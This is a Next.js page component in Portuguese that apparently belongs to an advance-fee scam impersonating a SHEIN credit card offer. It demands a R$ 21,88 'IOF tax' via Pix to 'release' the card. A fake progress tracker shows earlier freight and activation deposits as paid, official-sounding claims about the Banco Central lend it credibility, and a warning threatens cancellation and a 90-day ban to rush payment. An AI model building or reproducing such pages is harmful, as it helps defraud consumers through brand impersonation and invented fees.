"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Volume2 } from "lucide-react"

export default function IOFPaymentPage() {
  const [isVideoPlaying, setIsVideoPlaying] = useState(false)
  const router = useRouter()

  useEffect(() => {
    // Set favicon for IOF payment page
    const favicon = document.querySelector("link[rel*='icon']") || document.createElement("link")
    favicon.type = "image/png"
    favicon.rel = "shortcut icon"
    favicon.href = "/favicon-pix.png"
    document.getElementsByTagName("head")[0].appendChild(favicon)

    // Set page title
    document.title = "Pagamento IOF - Cartão SHEIN"
  }, [])

  const handlePayNow = () => {
    router.push("/upp10/checkout")
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <div className="max-w-md mx-auto p-4">
        <div className="bg-white rounded-lg shadow-md p-6">
          {/* Header */}
          <div className="mb-6">
            <h1 className="text-xl font-medium text-black mb-3">
              Parabéns, finalize a última etapa para concluir a sua solicitação
            </h1>
            <div className="w-20 h-0.5 bg-black mb-4"></div>
            <p className="text-gray-600 text-sm leading-relaxed">
              Você está a um passo de concluir o pedido do seu cartão de crédito. Ao solicitar a emissão do seu cartão
              de crédito ou a aprovação de um empréstimo, você estará sujeito à cobrança do Imposto sobre Operações
              Financeiras (IOF), que é regulamentado e emitido pelo Banco Central. Este imposto é aplicado para
              financiar operações financeiras e garantir a conformidade com as normas fiscais.
            </p>
          </div>

          {/* Video Section */}
          <div className="mx-6 mb-6 border border-gray-300 rounded-lg p-6">
            <h3 className="text-lg font-medium text-black mb-3">O que é o IOF?</h3>
            <div className="flex items-center gap-2 mb-4 text-gray-600">
              <span className="text-sm">Aumente o volume</span>
              <div className="flex gap-1">
                {[...Array(4)].map((_, i) => (
                  <Volume2 key={i} className="w-4 h-4 text-red-500" />
                ))}
              </div>
            </div>

            {/* Video Player */}
            <div className="relative rounded-lg overflow-hidden bg-black">
              <iframe
                src="https://player.vimeo.com/video/1097112346?h=cd8c906ca8&title=0&byline=0&portrait=0&badge=0&autopause=0&player_id=0&app_id=58479"
                width="100%"
                height="200"
                frameBorder="0"
                allow="autoplay; fullscreen; picture-in-picture"
                allowFullScreen
                className="w-full aspect-video rounded-lg"
              ></iframe>
            </div>

            {/* Progress Tracker */}
            <div className="mt-6 space-y-4 relative">
              <div className="absolute left-2.5 top-6 bottom-6 w-0.5 bg-gray-300"></div>

              {/* Step 1: Frete Payment - Completed */}
              <div className="flex items-center gap-4">
                <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center relative z-10">
                  <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path>
                  </svg>
                </div>
                <div className="flex items-center gap-3">
                  <svg className="w-8 h-8 text-green-500" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M9 11H7v6h2v-6zm4 0h-2v6h2v-6zm4 0h-2v6h2v-6zm2-7v2H4V4h3.5l1-1h7l1 1H20z"></path>
                  </svg>
                  <div>
                    <p className="font-medium text-green-600">Pagamento Frete</p>
                    <p className="text-sm text-green-500">Pagamento concluído com sucesso</p>
                  </div>
                </div>
              </div>

              {/* Step 2: Activation Deposit - Completed */}
              <div className="flex items-center gap-4">
                <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center relative z-10">
                  <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path>
                  </svg>
                </div>
                <div className="flex items-center gap-3">
                  <svg className="w-8 h-8 text-green-500" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
                  </svg>
                  <div>
                    <p className="font-medium text-green-600">Depósito de Ativação</p>
                    <p className="text-sm text-green-500">Pagamento concluído com sucesso</p>
                  </div>
                </div>
              </div>

              {/* Step 3: IOF Payment - Current */}
              <div className="flex items-center gap-4">
                <div className="w-5 h-5 bg-red-500 rounded-full relative z-10 animate-pulse">
                  <div className="absolute inset-0 bg-red-500 rounded-full animate-ping opacity-75"></div>
                </div>
                <div className="flex items-center gap-3">
                  <img src="/favicon-pix.png" alt="PIX" className="w-8 h-8" />
                  <div>
                    <p className="font-medium text-red-600">Pagamento do Imposto IOF</p>
                    <p className="text-sm text-red-500">Aguardando pagamento para liberação do cartão de crédito</p>
                  </div>
                </div>
              </div>

              {/* Step 4: Virtual Card - Pending */}
              <div className="flex items-center gap-4">
                <div className="w-5 h-5 bg-gray-300 rounded-full relative z-10"></div>
                <div className="flex items-center gap-3">
                  <svg className="w-8 h-8 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"></path>
                  </svg>
                  <div>
                    <p className="font-medium text-gray-400">Cartão Virtual Liberado</p>
                    <p className="text-sm text-gray-400">Cartão físico em preparação</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Warning Message */}
          <div className="px-6 mb-6">
            <p className="text-sm text-gray-600 text-center">
              O não pagamento do imposto resulta no cancelamento do pedido do cartão de crédito, impossibilitando uma
              nova contratação por um prazo máximo de 90 dias
            </p>
          </div>

          {/* Payment Section */}
          <div className="mx-6 mb-6 bg-white border border-gray-200 rounded-lg p-6 text-center">
            <div className="flex items-center justify-center gap-2 mb-2">
              <h3 className="text-lg font-medium text-black">Pague via Pix</h3>
              <svg className="w-6 h-6 text-teal-500" fill="currentColor" viewBox="0 0 24 24">
                <path d="m15.45 16.52l-3.01-3.01c-.11-.11-.24-.13-.31-.13s-.2.02-.31.13L8.8 16.53c-.34.34-.87.89-2.64.89l3.71 3.7a3 3 0 0 0 4.24 0l3.72-3.71c-.91 0-1.67-.18-2.38-.89M8.8 7.47l3.02 3.02c.08.08.2.13.31.13s.23-.05.31-.13l2.99-2.99c.71-.74 1.52-.91 2.43-.91l-3.72-3.71a3 3 0 0 0-4.24 0l-3.71 3.7c1.76 0 2.3.58 2.61.89"></path>
                <path d="m21.11 9.85l-2.25-2.26H17.6c-.54 0-1.08.22-1.45.61l-3 3c-.28.28-.65.42-1.02.42a1.5 1.5 0 0 1-1.02-.42L8.09 8.17c-.38-.38-.9-.6-1.45-.6H5.17l-2.29 2.3a3 3 0 0 0 0 4.24l2.29 2.3h1.48c.54 0 1.06-.22 1.45-.6l3.02-3.02c.28-.28.65-.42 1.02-.42s.74.14 1.02.42l3.01 3.01c.38.38.9.6 1.45.6h1.26l2.25-2.26a3.04 3.04 0 0 0-.02-4.29"></path>
              </svg>
            </div>
            <p className="text-sm text-gray-600 mb-4">O pagamento será confirmado imediatamente</p>
            <div className="text-3xl font-medium text-teal-500 mb-4">R$ 21,88</div>
            <button
              onClick={handlePayNow}
              className="w-full py-3 px-6 bg-black text-white font-medium rounded-full transition-all duration-200 hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              Pagar agora
            </button>
            <div className="flex items-center justify-center gap-2 mt-3 text-sm text-gray-600">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M10,17L6,13L7.41,11.59L10,14.17L16.59,7.58L18,9L10,17Z"></path>
              </svg>
              Ambiente seguro
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
